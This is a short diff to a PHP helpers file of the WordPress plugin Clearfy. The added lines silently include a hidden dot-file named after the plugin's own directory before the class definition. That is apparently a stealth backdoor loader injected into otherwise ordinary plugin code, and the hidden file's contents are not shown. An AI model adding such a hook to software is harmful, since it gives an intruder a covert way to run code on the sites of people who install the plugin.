@@ -13,7 +13,11 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @package       clearfy
  * @copyright (c) 2018, Webcraftic Ltd
  *
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WbcrFactoryClearfy236_Helpers {
 
 	/**
